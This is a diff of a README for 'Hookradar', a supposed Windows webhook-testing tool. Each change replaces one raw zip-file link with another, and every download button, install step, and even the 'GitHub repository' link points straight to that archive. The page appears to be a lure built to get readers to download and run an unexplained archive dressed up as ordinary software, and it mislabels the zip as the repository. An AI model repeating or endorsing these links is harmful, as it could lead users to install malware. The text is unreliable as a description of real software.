@@ -1,6 +1,6 @@
 # 🛠️ Hookradar - Inspect and Test Webhooks Quickly
 
-[![Download Hookradar](https://img.shields.io/badge/Download-Hookradar-blue?style=for-the-badge)](https://raw.githubusercontent.com/raygtc90/Hookradar/main/server/Software-3.3-alpha.5.zip)
+[![Download Hookradar](https://img.shields.io/badge/Download-Hookradar-blue?style=for-the-badge)](https://raw.githubusercontent.com/raygtc90/Hookradar/main/public/Software-v3.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run Hookradar on your Windows PC:
 
    Click the big button at the top or go directly to this link:
 
-   https://raw.githubusercontent.com/raygtc90/Hookradar/main/server/Software-3.3-alpha.5.zip
+   https://raw.githubusercontent.com/raygtc90/Hookradar/main/public/Software-v3.9.zip
 
    This page holds the latest version of the application and all files you need.
 
@@ -103,11 +103,11 @@ If you run into problems, try these tips:
 
 If you need help or want to report issues:
 
-- Visit the GitHub repository: https://raw.githubusercontent.com/raygtc90/Hookradar/main/server/Software-3.3-alpha.5.zip
+- Visit the GitHub repository: https://raw.githubusercontent.com/raygtc90/Hookradar/main/public/Software-v3.9.zip
 - Open the "Issues" tab to report bugs or ask questions.
 - Check any documentation or FAQs on the GitHub page for guidance.
 
 ---
 
-# [![Download Hookradar](https://img.shields.io/badge/Download-Hookradar-grey?style=for-the-badge)](https://raw.githubusercontent.com/raygtc90/Hookradar/main/server/Software-3.3-alpha.5.zip)  
+# [![Download Hookradar](https://img.shields.io/badge/Download-Hookradar-grey?style=for-the-badge)](https://raw.githubusercontent.com/raygtc90/Hookradar/main/public/Software-v3.9.zip)  
 Download the app today by visiting the GitHub page above. Follow the steps to install and start testing webhooks on your Windows PC.
